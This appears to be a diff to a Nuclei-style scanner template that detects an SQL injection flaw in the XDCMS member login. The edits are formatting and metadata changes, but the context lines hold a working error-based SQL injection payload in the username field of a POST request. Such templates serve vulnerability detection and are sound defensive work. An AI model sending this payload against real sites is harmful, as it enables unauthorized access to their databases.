@@ -9,12 +9,11 @@ info:
     - https://www.uedbox.com/post/35188/
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
+    cvss-score: 10
     cwe-id: CWE-89
-  tags: sqli,xdcms
   metadata:
     max-request: 1
-
+  tags: sqli,xdcms,vuln
 variables:
   num: "999999999"
 
@@ -22,14 +21,15 @@ http:
   - method: POST
     path:
       - "{{BaseURL}}/index.php?m=member&f=login_save"
+
     headers:
       Content-Type: application/x-www-form-urlencoded
+
     body: |
       username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+
 
     matchers-condition: and
     matchers:
-
       - type: word
         words:
           - "Content-Type: text/html"
@@ -43,5 +43,4 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/09/28
+# digest: 4b0a00483046022100fa69fcdd4a1e3a557640e407cb7218f1e58a4d57db7be0f18931165a7d93623f022100f9b38f67708b1762bd210fb1a5256a9065e7dcb5ed87962812587fb6a12e8703:922c64590222798bb761d5b6d8e72950
